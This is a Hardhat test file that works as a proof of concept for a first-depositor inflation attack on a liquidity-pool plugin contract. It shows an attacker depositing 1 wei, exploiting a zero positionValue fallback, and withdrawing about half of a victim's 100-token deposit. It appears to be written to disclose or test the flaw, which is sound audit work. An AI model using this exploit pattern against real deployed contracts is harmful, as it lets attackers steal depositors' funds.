import { ethers } from 'hardhat';
import { setup } from '../utils/setup';
import { expect } from "chai";

describe("PoC: First-Depositor Inflation Attack", () => {
    const INITIAL_LP_TOKEN_TO_MINT = 10n ** 32n;
    const TICK_LOWER = -887220; // near full-range (tick spacing = 60)
    const TICK_UPPER = 887220;

    it("attacker steals ~50% of victim deposit via positionValue=0 fallback", async function () {
        this.timeout(100_000_000);

        const { callback, plugin, pool, token0, token1, signers } = await setup(3);
        const [, attacker, victim] = signers;

        for (const user of [attacker, victim]) {
            await token0.connect(user).approve(plugin, ethers.MaxUint256);
            await token1.connect(user).approve(plugin, ethers.MaxUint256);
        }

        // Step 1: Attacker front-runs with 1 wei dust deposit
        await plugin.connect(attacker).deposit(
            attacker.address,
            TICK_LOWER,
            TICK_UPPER,
            1,
            1,
            0,
            Number.MAX_SAFE_INTEGER
        )

        const lpTokenAddr = await plugin.lpTokenByTicks(TICK_LOWER, TICK_UPPER);
        const lpToken = await ethers.getContractAt("LPToken", lpTokenAddr);
        expect(await lpToken.balanceOf(attacker.address)).to.equal(INITIAL_LP_TOKEN_TO_MINT);

        // Key condition: positionValue rounds to 0 for dust liquidity
        const { price } = await pool.globalState();
        expect(await plugin.positionValue(TICK_LOWER, TICK_UPPER, price)).to.equal(0n);

        // Step 2: Victim deposits 100 tokens — gets same fixed LP amount due to fallback
        const victimDeposit = ethers.parseEther("100");
        await plugin.connect(victim).deposit(
            victim.address,
            TICK_LOWER,
            TICK_UPPER,
            victimDeposit,
            victimDeposit,
            0,
            Number.MAX_SAFE_INTEGER
        )

        const attackerLP = await lpToken.balanceOf(attacker.address);
        const victimLP = await lpToken.balanceOf(victim.address);
        expect(victimLP).to.equal(INITIAL_LP_TOKEN_TO_MINT);
        expect(attackerLP * 10000n / (attackerLP + victimLP)).to.equal(5000n); // 50/50 split

        // Step 3: Attacker withdraws ~50% of pool value
        const t0Before = await token0.balanceOf(attacker.address);
        const t1Before = await token1.balanceOf(attacker.address);

        await plugin.connect(attacker).withdraw(attacker.address, TICK_LOWER, TICK_UPPER, attackerLP, 0, 0);

        const stolen0 = (await token0.balanceOf(attacker.address)) - t0Before;
        const stolen1 = (await token1.balanceOf(attacker.address)) - t1Before;

        console.log(`Attacker deposited 1 wei each, withdrew ${ethers.formatEther(stolen0)} / ${ethers.formatEther(stolen1)} tokens`);

        // Attacker receives ~50 tokens per side from a 1 wei investment
        expect(stolen0).to.be.closeTo(victimDeposit / 2n, victimDeposit / 200n);
        expect(stolen1).to.be.closeTo(victimDeposit / 2n, victimDeposit / 200n);
    });
});
